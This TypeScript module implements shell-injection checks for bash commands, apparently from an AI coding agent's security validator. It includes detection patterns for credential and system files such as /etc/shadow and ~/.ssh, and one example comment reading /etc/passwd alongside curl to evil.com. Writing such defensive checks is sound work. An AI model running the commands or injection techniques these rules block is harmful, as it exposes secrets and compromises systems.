/**
 * Shell injection pattern checks for bash command security.
 *
 * Check IDs 4-6, 11, 14-16, 21 — each is a pure function that analyzes
 * a command string and its AST for shell injection risks.
 *
 * These checks align with Claude Code's bashSecurity.ts design:
 *  4. Unescaped shell metacharacters in arguments
 *  5. Command substitution attempts
 *  6. Shell parameter expansion in dangerous contexts
 * 11. IFS manipulation
 * 14. Redirect to sensitive paths
 * 15. Input redirection from sensitive paths
 * 16. Process substitution
 * 21. Unicode homoglyph attacks
 */

import type { TsNode } from '../../utils/bash/bash-tokenizer.js';
import {
  hasUnescapedChar,
  findUnescapedChars,
} from './quote-extraction.js';
import type { ValidationContext, ValidatorResult } from './bash-security-validator.js';

// ---------------------------------------------------------------------------
// Check 4: Unescaped shell metacharacters in arguments
// ---------------------------------------------------------------------------

const SHELL_METACHARS = new Set(['|', '&', ';', '$', '`', '#']);

/**
 * Detects unescaped shell metacharacters that could enable command chaining,
 * piping, or code execution within arguments. These are only dangerous when
 * outside of quoted regions.
 */
export function checkUnescapedMetacharacters(ctx: ValidationContext): ValidatorResult {
  const found = findUnescapedChars(ctx.command, SHELL_METACHARS);

  if (found.size === 0) {
    return { kind: 'passthrough' };
  }

  // Backticks are direct command execution — always deny
  if (found.has('`')) {
    const chars = [...found].join(', ');
    return {
      kind: 'deny',
      checkId: 4,
      message: `Backtick command substitution detected (chars: ${chars}). ` +
        `Backticks allow arbitrary command execution.`,
    };
  }

  // Unescaped $ indicates variable expansion — ask for confirmation
  if (found.has('$')) {
    return {
      kind: 'ask',
      checkId: 4,
      message: 'Unescaped $ detected in command. Variable expansion could ' +
        'inject unexpected values into command arguments.',
    };
  }

  // |, &, ; are less dangerous but still suspicious in arguments
  if (found.has('|') || found.has('&') || found.has(';')) {
    const chars = [...found].join(', ');
    return {
      kind: 'ask',
      checkId: 4,
      message: `Shell metacharacters (${chars}) found in command arguments. ` +
        `These may indicate command chaining.`,
    };
  }

  return { kind: 'passthrough' };
}

// ---------------------------------------------------------------------------
// Check 5: Command substitution attempts $(...) or backticks
// ---------------------------------------------------------------------------

const CMDSUB_PATTERNS = [/\$\(/, /`[^`]*`/];

/**
 * Command substitution ($(cmd) or backticks) executes arbitrary commands
 * and substitutes the output. This is a primary vector for command injection.
 *
 * The AST parser's DANGEROUS_TYPES set already catches command_substitution
 * nodes — this check provides a fallback regex layer for unparsed or
 * edge-case commands.
 */
export function checkCommandSubstitution(ctx: ValidationContext): ValidatorResult {
  for (const pattern of CMDSUB_PATTERNS) {
    if (pattern.test(ctx.command)) {
      return {
        kind: 'deny',
        checkId: 5,
        message: 'Command substitution $(...) or backticks detected. ' +
          'This executes arbitrary nested commands.',
      };
    }
  }

  // AST-based detection if available
  if (ctx.ast) {
    const hasCmdSub = nodeContainsType(ctx.ast, 'command_substitution');
    if (hasCmdSub) {
      return {
        kind: 'deny',
        checkId: 5,
        message: 'Command substitution node detected in AST.',
      };
    }
  }

  return { kind: 'passthrough' };
}

// ---------------------------------------------------------------------------
// Check 6: Shell parameter expansion ${...} in dangerous contexts
// ---------------------------------------------------------------------------

/**
 * Detects shell parameter expansion ${VAR:-default}, ${VAR//pattern/replace},
 * ${#VAR}, etc. in dangerous contexts (not in simple $VAR references).
 *
 * In bash, ${...} can:
 * - Execute commands: ${param:?error message} causes shell exit if unset
 * - Modify IFS-like behavior: ${param//pattern/replacement}
 * - Indirection: ${!indirect_ref}
 *
 * Simple $VAR or ${VAR} alone is not flagged — only complex expansions.
 */
export function checkParameterExpansion(ctx: ValidationContext): ValidatorResult {
  // Match ${...} with operators inside: -, :-, +, :+, =, :=, ?, :?, #, ##, %, %%, /, //
  const complexExpansionRe = /\$\{[^}]*[:\-#%\/=+?][^}]*\}/;

  if (complexExpansionRe.test(ctx.command)) {
    return {
      kind: 'ask',
      checkId: 6,
      message: 'Complex shell parameter expansion ${...} detected. ' +
        'Parameter expansions can modify shell behavior or access indirect variables.',
    };
  }

  return { kind: 'passthrough' };
}

// ---------------------------------------------------------------------------
// Check 11: IFS manipulation
// ---------------------------------------------------------------------------

const IFS_PATTERNS = [
  /\bIFS\s*=\s*/i,
  /\bexport\s+IFS\b/i,
  /\bdeclare\s+(-[xi]+\s+)?IFS\b/i,
  /\blocal\s+IFS\s*=/i,
];

/**
 * The IFS (Internal Field Separator) variable controls word-splitting in bash.
 * Manipulating IFS can:
 * - Bypass argument parsing (e.g., IFS='/' turns paths into multiple args)
 * - Enable hidden command injection (e.g., IFS=';' makes ';' a word boundary)
 * - Explode intended single arguments into multiple dangerous ones
 */
export function checkIFSManipulation(ctx: ValidationContext): ValidatorResult {
  for (const pattern of IFS_PATTERNS) {
    if (pattern.test(ctx.command)) {
      return {
        kind: 'deny',
        checkId: 11,
        message: 'IFS manipulation detected. Modifying IFS can bypass argument ' +
          'parsing and enable command injection.',
      };
    }
  }
  return { kind: 'passthrough' };
}

// ---------------------------------------------------------------------------
// Check 14: Redirect to sensitive paths
// ---------------------------------------------------------------------------

const SENSITIVE_OUTPUT_PATHS = [
  /\/etc\/(shadow|passwd|sudoers|group|hosts|crontab|fstab)\b/,
  /\/proc\/(self|sys)\b/,
  /~\/\.ssh\/(authorized_keys|config|id_)/,
  /\.\.\/etc\//,
  /\/boot\/(grub|efi|loader)\b/,
  /\/lib\/(systemd|modules)\b/,
  /\/var\/spool\/cron\b/,
];

/**
 * Redirecting output (>, >>, &>, etc.) to system configuration files,
 * bootloader paths, SSH keys, or /proc entries is always dangerous.
 */
export function checkSensitiveOutputRedirect(ctx: ValidationContext): ValidatorResult {
  // Only check if we have an actual redirect operator
  if (!hasUnescapedChar(ctx.command, '>')) {
    return { kind: 'passthrough' };
  }

  for (const pattern of SENSITIVE_OUTPUT_PATHS) {
    const match = pattern.exec(ctx.command);
    if (match) {
      return {
        kind: 'deny',
        checkId: 14,
        message: `Redirect to sensitive path detected: ${match[0]}. ` +
          'Writing to system files, SSH keys, or /proc can compromise system security.',
      };
    }
  }

  return { kind: 'passthrough' };
}

// ---------------------------------------------------------------------------
// Check 15: Input redirection from sensitive paths
// ---------------------------------------------------------------------------

const SENSITIVE_INPUT_PATHS = [
  /\/etc\/(shadow|passwd|sudoers)\b/,
  /\/proc\/([0-9]+)\/mem\b/,
  /~\/\.(ssh|gnupg|aws|kube)\//,
  /\/root\/\./,
];

/**
 * Reading from system auth files, /proc/mem (which can read process memory),
 * or cryptographic key material via input redirection (<, <<, <<<).
 */
export function checkSensitiveInputRedirect(ctx: ValidationContext): ValidatorResult {
  // Only check if we have an input redirect
  if (!hasUnescapedChar(ctx.command, '<')) {
    return { kind: 'passthrough' };
  }

  for (const pattern of SENSITIVE_INPUT_PATHS) {
    const match = pattern.exec(ctx.command);
    if (match) {
      return {
        kind: 'ask',
        checkId: 15,
        message: `Input redirection from sensitive path detected: ${match[0]}. ` +
          'Reading from system auth files or process memory can expose secrets.',
      };
    }
  }

  return { kind: 'passthrough' };
}

// ---------------------------------------------------------------------------
// Check 16: Process substitution <() or >()
// ---------------------------------------------------------------------------

const PROCESS_SUB_RE = /[<>]\([^)]*\)/;

/**
 * Process substitution (<(cmd) or >(cmd)) creates named pipes and runs
 * commands asynchronously. The output/input of a command is connected to
 * a pipe, which can enable hidden command execution or data exfiltration.
 *
 * Example: diff <(curl evil.com) <(cat /etc/passwd)
 */
export function checkProcessSubstitution(ctx: ValidationContext): ValidatorResult {
  if (PROCESS_SUB_RE.test(ctx.command)) {
    return {
      kind: 'deny',
      checkId: 16,
      message: 'Process substitution <() or >() detected. ' +
        'This runs commands asynchronously via named pipes.',
    };
  }

  if (ctx.ast) {
    const hasProcSub = nodeContainsType(ctx.ast, 'process_substitution');
    if (hasProcSub) {
      return {
        kind: 'deny',
        checkId: 16,
        message: 'Process substitution node detected in AST.',
      };
    }
  }

  return { kind: 'passthrough' };
}

// ---------------------------------------------------------------------------
// Check 21: Unicode homoglyph attacks in command names
// ---------------------------------------------------------------------------

/**
 * Common Latin-Cyrillic homoglyphs used in typo-squatting attacks.
 * Characters that look identical to ASCII but are from different
 * Unicode blocks.
 */
const HOMOGLYPH_MAP: Record<string, string> = {
  // Cyrillic lookalikes
  'а': 'a',   // а (Cyrillic a) -> a
  'е': 'e',   // е (Cyrillic ie) -> e
  'о': 'o',   // о (Cyrillic o) -> o
  'р': 'p',   // р (Cyrillic er) -> p
  'с': 'c',   // с (Cyrillic es) -> c
  'у': 'y',   // у (Cyrillic u) -> y
  'х': 'x',   // х (Cyrillic kha) -> x
  'ѕ': 's',   // ѕ (Cyrillic dze) -> s
  'і': 'i',   // і (Cyrillic i) -> i
  'һ': 'h',   // һ (Cyrillic shha) -> h

  // Greek lookalikes
  'α': 'a',   // α (alpha) -> a
  'ε': 'e',   // ε (epsilon) -> e
  'ι': 'i',   // ι (iota) -> i
  'ο': 'o',   // ο (omicron) -> o
  'υ': 'u',   // υ (upsilon) -> u
};

const HOMOGLYPH_RE = new RegExp(`[${Object.keys(HOMOGLYPH_MAP).join('')}]`);

/**
 * Detects Unicode characters that look like ASCII but are from different
 * code blocks. Attackers use these to create fake command names that
 * visually appear legitimate but execute different code.
 *
 * Example: "sudо" (using Cyrillic 'о' instead of Latin 'o') runs a
 * potentially malicious command instead of the real sudo.
 */
export function checkUnicodeHomoglyphs(ctx: ValidationContext): ValidatorResult {
  if (!HOMOGLYPH_RE.test(ctx.command)) {
    return { kind: 'passthrough' };
  }

  // Extract suspected word from the command
  const words = ctx.command.split(/\s+/);
  const suspicious: string[] = [];

  for (const word of words) {
    for (let i = 0; i < word.length; i++) {
      const ch = word[i]!;
      if (HOMOGLYPH_MAP[ch]) {
        const asciiEquivalent = word.split('').map(c => HOMOGLYPH_MAP[c] || c).join('');
        suspicious.push(`"${word}" (looks like "${asciiEquivalent}")`);
        break;
      }
    }
  }

  if (suspicious.length > 0) {
    return {
      kind: 'deny',
      checkId: 21,
      message: `Unicode homoglyph attack detected: ${suspicious.join(', ')}. ` +
        'These characters look like ASCII but are from different Unicode blocks, ' +
        'potentially masking a malicious command.',
    };
  }

  return { kind: 'passthrough' };
}

// ---------------------------------------------------------------------------
// AST helper
// ---------------------------------------------------------------------------

/**
 * Recursively search the AST tree for a node with the given type.
 * Returns true if any descendant (or self) has the matching type.
 */
function nodeContainsType(node: TsNode, typeName: string): boolean {
  if (node.type === typeName) {
    return true;
  }
  for (const child of node.children) {
    if (nodeContainsType(child, typeName)) {
      return true;
    }
  }
  return false;
}
